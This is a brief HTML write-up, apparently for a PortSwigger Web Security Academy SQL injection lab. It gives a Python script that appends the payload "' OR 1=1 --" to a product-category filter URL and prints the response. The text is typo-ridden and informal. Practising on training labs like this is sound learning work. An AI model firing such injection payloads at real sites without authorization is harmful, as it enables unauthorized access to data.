 <title>portswigger---SQL injection attackWriteup  </title>
 

<!DOCTYPE html>
<html>
 
<body>
    <h1>portswigger---SQL injection attackWriteup </h1>

    <h2>Challenge Description</h2>
    <p>  this is  python code and works about solutions for https://portswigger.net/
sqli lab and do sqli attack in site for test have sqli or no
</p>

    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol> 
     use this sqli attack for etst if site has sqli vulerbility ot no
<pre>
#url is where have sqi vulunerability https://0ae700be049cfce18390e9b6003b0001.web-security-academy.net/filter?category=
import requests
def solve(url):
    """Perform a full SQL injection attack if detected"""
    payload = "' OR 1=1 --"
    attack_url = f"{url}{payload}"

    try:
        response = requests.get(attack_url, timeout=5)
        return response.text[:1000]  # Limit output for safety
    except Exception as e:
        return f"Error: {str(e)}"

 
</pre>
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">when attack was successfull show solved message

    <h2>Conclusion</h2>
    <p>this is a medium chanllenge for work on  web anbd sqli</p>

</body>
</html>
